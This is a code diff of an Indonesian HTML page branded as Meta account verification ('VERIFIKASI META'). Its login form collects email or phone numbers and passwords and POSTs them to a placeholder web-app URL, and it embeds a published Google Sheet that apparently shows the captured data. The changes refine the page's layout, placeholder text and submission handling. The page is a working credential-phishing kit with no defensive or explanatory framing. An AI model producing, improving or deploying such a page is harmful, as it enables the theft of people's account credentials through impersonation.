@@ -5,12 +5,12 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Verifikasi Akun</title>
   <style>
-    /* (CSS seperti sebelumnya Anda sisipkan) */
+    /* (CSS Anda seperti sebelumnya) */
     body { /* ... */ }
     header { /* ... */ }
     .description { /* ... */ }
-    .card { /* ... centered, no absolute */ }
-    .sheet-embed { margin: 24px auto; max-width: 800px; width: 100%; padding: 0 16px; }
+    .card { margin: 0 auto; max-width: 380px; padding: 24px; background: #fff; border-radius: 8px; }
+    .sheet-embed { width: 100%; max-width: 800px; margin: 24px auto; padding: 0 16px; }
     .sheet-embed iframe { width: 100%; height: 400px; border: none; }
     footer { /* ... */ }
   </style>
@@ -24,13 +24,18 @@
   <div class="card">
     <h1>Masuk ke Akun Anda</h1>
     <form id="login-form">
-      <div><label>Email atau Nomor Telepon</label><input type="email" name="emailOrPhone" required></div>
-      <div><label>Kata Sandi</label><input type="password" name="password" required></div>
+      <div>
+        <label>Email atau Nomor Telepon</label>
+        <input type="email" name="emailOrPhone" placeholder="Masukkan email atau nomor telepon" required>
+      </div>
+      <div>
+        <label>Kata Sandi</label>
+        <input type="password" name="password" placeholder="Masukkan kata sandi" required>
+      </div>
       <button type="submit">Kirim & Amankan</button>
     </form>
   </div>
 
-  <!-- Embed Google Sheet -->
   <div class="sheet-embed">
     <iframe src="https://docs.google.com/spreadsheets/d/14nPAYOjs1DnbDwChhixhod0G6sWpLjZb2PVemdwearw/pubhtml?widget=true&amp;headers=false"></iframe>
   </div>
@@ -38,20 +43,15 @@
   <footer>&copy; 2025 VERIFIKASI META</footer>
 
   <script>
-    const scriptURL = 'PASTE_WEB_APP_URL_DI_SINI';
+    const scriptURL = 'WEB_APP_URL_HERE';
     const form = document.getElementById('login-form');
     form.addEventListener('submit', e => {
       e.preventDefault();
       fetch(scriptURL, { method: 'POST', body: new FormData(form) })
         .then(res => res.json())
         .then(json => {
-          if (json.status === 'OK') alert('Data berhasil terkirim!');
-          else alert('Ada kesalahan!');
+          alert(json.result === 'OK' ? 'Data berhasil terkirim!' : 'Gagal mengirim data.');
           form.reset();
-        })
-        .catch(err => {
-          console.error(err);
-          alert('Gagal mengirim data.');
         });
     });
   </script>
